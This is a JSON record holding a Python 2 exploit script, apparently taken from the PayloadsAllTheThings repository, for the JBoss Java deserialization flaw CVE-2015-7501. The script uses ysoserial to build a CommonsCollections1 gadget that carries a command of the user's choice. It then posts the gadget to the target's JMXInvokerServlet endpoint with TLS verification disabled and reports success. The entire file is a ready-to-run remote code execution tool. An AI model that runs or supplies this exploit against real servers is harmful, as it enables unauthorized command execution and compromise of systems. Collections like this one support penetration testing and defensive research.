{
    "code": "#! /usr/bin/env python2\n\n# Jboss Java Deserialization RCE (CVE-2015-7501)\n# Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nimport argparse\nimport sys, os\n#from binascii import hexlify, unhexlify\nfrom subprocess import check_output\n\nysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']\nysoserial_path = None\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')\nparser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif not args.ysoserial_path:\n    for path in ysoserial_default_paths:\n        if os.path.exists(path):\n            ysoserial_path = path\nelse:\n    if os.path.exists(args.ysoserial_path):\n        ysoserial_path = args.ysoserial_path\n\nif ysoserial_path is None:\n    print('[-] Could not find ysoserial JAR file')\n    sys.exit(1)\n\nif len(args.target.split(\":\")) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nip, port = args.target.split(':')\n\nprint('[*] Target IP: {}'.format(ip))\nprint('[*] Target PORT: {}'.format(port))\n\ngadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections1', args.command])\n\nr = requests.post('{}://{}:{}/invoker/JMXInvokerServlet'.format(args.proto, ip, port), verify=False, data=gadget)\n\nif r.status_code == 200:\n    print('[+] Command executed successfully')",
    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
    "file": "CVE Exploits/JBoss CVE-2015-7501.py",
    "license": "MIT",
    "language": "python"
}